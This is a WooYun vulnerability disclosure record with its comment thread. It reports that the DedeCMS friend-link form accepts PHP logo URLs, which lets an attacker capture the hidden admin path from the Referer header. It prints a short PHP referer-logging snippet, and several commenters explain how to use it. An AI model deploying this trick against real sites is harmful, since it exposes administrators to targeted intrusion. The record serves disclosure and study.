{"id": 48833, "wybug_id": "wooyun-2014-076556", "wybug_title": "织梦某处设计缺陷导致后台地址泄露", "wybug_corp": "Dedecms", "wybug_author": "MuZhU0", "wybug_date": "2014-09-19 14:26", "wybug_open_date": "2014-12-15 14:28", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-24：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-15：\t细节向公众公开  简要描述： 某处设计缺陷，程序对某些东西过滤不严，导致后台地址泄露，仅测试了5.7。目测其它版本同样存在问题。 详细说明：  \n\nDEDECMS对友情链接申请的LOGO地址没有进行严格的判断和过滤，导致可以提交PHP、ASP等后缀。且后台查看友情链接时，如下图所示，图片仍是申请时提交的URL。\n\nX.PHP 代码:<?phpfile_put_contents('x.txt',$_SERVER['HTTP_REFERER']);header(\"Content-type:image/jpeg\");$img=imagecreatefromjpeg(\"x.jpg\");imagejpeg($img);imagedestroy($img);?>当访问该文件，获取$_SERVER['HTTP_REFERER']，并且写出文件到X.TXT。\n\n   漏洞证明：  \n\nX.PHP 代码:<?phpfile_put_contents('x.txt',$_SERVER['HTTP_REFERER']);header(\"Content-type:image/jpeg\");$img=imagecreatefromjpeg(\"x.jpg\");imagejpeg($img);imagedestroy($img);?>当访问该文件，获取$_SERVER['HTTP_REFERER']，并且写出文件到X.TXT。\n\n   修复方案：  应该都明白的，我就不献丑了。   版权声明：转载请注明来源 MuZhU0@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-15 14:28 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-19 14:27 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  刘明~！    \n     2014-09-19 14:38 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  这个好！    \n     2014-09-19 15:15 |    \t\t赈早见琥珀主 \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:5        )\t\t \n  目测要火    \n     2014-09-19 15:21 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  最需要的就是这个玩意了！    \n     2014-09-19 15:30 |    \t\tSafe \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 一个平凡的人)\t\t \n  有这个BUG，妈妈再也不用担心你找不到后台了    \n     2014-09-19 15:31 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  我去，这个威力略大    \n     2014-09-19 15:56 |    \t\tWalle \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:5        | ...   位卑、未敢忘忧国！   ...)\t\t \n  哈哈！！！！！    \n     2014-09-19 16:15 |    \t\tGrayon \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        | 今天怎么不开心 :‮)\t\t \n  我喜欢这个    \n     2014-09-20 07:49 |    \t\tbey0nd \t\t\t( 普通白帽子  |\t\t\t        Rank:895 漏洞数:142        | 相忘于江湖，不如相濡以沫)\t\t \n  卧槽    \n     2014-09-22 10:22 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  这个给力，一直是个头痛的问题    \n     2014-09-23 20:18 |    \t\tAzui \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:10        | 用一只黑色铅笔画一出舞台默剧。)\t\t \n  这个比较屌    \n     2014-09-25 10:50 |    \t\t微尘 \t\t\t( 普通白帽子  |\t\t\t        Rank:218 漏洞数:74        )\t\t \n   为毛还不公开    \n     2014-09-25 10:50 |    \t\t微尘 \t\t\t( 普通白帽子  |\t\t\t        Rank:218 漏洞数:74        )\t\t \n  @MuZhU0  直接漏点吧，不用怕我们会LJ你的。放心我们都不是什么好人    \n     2014-09-25 17:54 |    \t\tMuZhU0 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        )\t\t \n  @微尘 哈哈哈，这个东西其实非常鸡肋。    \n     2014-09-26 09:01 |    \t\t发条橙子 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:6        | ∑(っ °Д °;)っ)\t\t \n  别是日志就行。。    \n     2014-09-26 14:04 |    \t\temeditor \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 过来乌云学习 求大神别黑)\t\t \n  这个必须能火…    \n     2014-09-26 20:59 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  哈哈  幸亏厂商无良...        \n     2014-09-26 22:09 |    \t\t风情万种 \t\t\t( 普通白帽子  |\t\t\t        Rank:181 漏洞数:63        | 不再相信爱了)\t\t \n  我喜欢！    \n     2014-09-27 10:56 |    \t\tlck丶 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 求大牛拿0day砸死)\t\t \n  卧槽    \n     2014-09-27 14:33 |    \t\t微尘 \t\t\t( 普通白帽子  |\t\t\t        Rank:218 漏洞数:74        )\t\t \n  @MuZhU0  不是那个日志吧？求漏电有木有    \n     2014-09-27 18:09 |    \t\tMuZhU0 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        )\t\t \n  @微尘 既然忽略了，就说了吧。友情链接申请哪里可以提交PHP文件，管理员后台看友情链接申请的时候，PHP获取来源页就行了。    \n     2014-09-27 18:16 |    \t\t风情万种 \t\t\t( 普通白帽子  |\t\t\t        Rank:181 漏洞数:63        | 不再相信爱了)\t\t \n  @MuZhU0 这样子的哇！有点鸡肋啊    \n     2014-09-27 20:45 |    \t\tMuZhU0 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        )\t\t \n  @风情万种 是哇，鸡肋。    \n     2014-09-27 20:50 |    \t\tAzui \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:10        | 用一只黑色铅笔画一出舞台默剧。)\t\t \n  @MuZhU0 我记得之前就有人发过 通过流量统计那边查看管理员访问的链接,原理一样，鸡肋- -。    \n     2014-10-02 21:21 |    \t\t铁汉 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:6        | 向各种大神学习之)\t\t \n  必须会火，求关注    \n     2014-10-11 14:37 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  需要交互嘛～～    \n     2014-10-11 15:57 |    \t\t0x334 \t\t\t( 普通白帽子  |\t\t\t        Rank:171 漏洞数:35        | 漏洞无影响，已忽略～～～～～～～)\t\t \n  利用确实有点鸡肋    \n     2014-10-13 14:32 |    \t\tshack2 \t\t\t( 普通白帽子  |\t\t\t        Rank:470 漏洞数:71        | QQ:1341413415 一个热爱编程(Java),热爱网...)\t\t \n  referer一直是个让人不省心的的东西啊    \n     2014-10-14 11:25 |    \t\tchowner \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 运维工程师 兼职搞安全)\t\t \n  referer，难怪被忽略，还需要交互。。    \n     2014-12-15 14:37 |    \t\t老黑 \t\t\t( 普通白帽子  |\t\t\t        Rank:161 漏洞数:61        | 最爱红颜不老。)\t\t \n  图片也可以查看REFFER啊  为什么一定要ASP PHP呢    \n     2014-12-15 17:46 |    \t\tMuZhU0 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        )\t\t \n  @老黑 PHP写出文件不是更方便嘛。    \n     2014-12-24 17:47 |    \t\tMxx \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 没有)\t\t \n  x.txt ? 本地 还是 目标站？    \n     2014-12-25 08:58 |    \t\t带我玩 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:6        | 带我玩)\t\t \n  x.txt 是写入到根目录还是哪里...楼主    \n     2015-01-17 10:22 |    \t\tSofia \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:6        | 不会渗透的SEOer不是好站长)\t\t \n  @带我玩 是自己本地的，试下就知道了    \n     2015-01-17 10:22 |    \t\tSofia \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:6        | 不会渗透的SEOer不是好站长)\t\t \n  @Mxx 是自己本地的，试下就知道了    \n     2015-01-18 15:34 |    \t\tMxx \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 没有)\t\t \n  @Sofia 测试跳转到后台？    \n     2015-01-18 16:11 |    \t\tSofia \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:6        | 不会渗透的SEOer不是好站长)\t\t \n  @Mxx 这个很简单啊，就是远程链接一个自己服务器的php文件，管理访问后台那个地方的时候就会加载这个php，然后自己这个php文件同目录会生成x.txt文件，里面记录了referer，就是后台路径    \n     2015-01-19 14:36 |    \t\tMxx \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 没有)\t\t \n  @Sofia 我懂了，谢了。    \n     2015-01-22 15:24 |    \t\txsjswt \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:49        | 我思故我猥琐，我猥琐故我强大)\t\t \n  这个没用啊，就算后缀是图片的，服务器是我控制的，依然可以抓到referer    \n     2015-08-05 23:07 |    \t\t乌帽子 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:3        | 学习黑客哪家强 | 中国山东找蓝翔 | sql...)\t\t \n  这个没用啊，就算后缀是图片的，服务器是我控制的，依然可以抓到referer    \n     2015-08-24 14:57 |    \t\t鬼五 \t\t\t( 普通白帽子  |\t\t\t        Rank:214 漏洞数:83        )\t\t \n  大爱    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}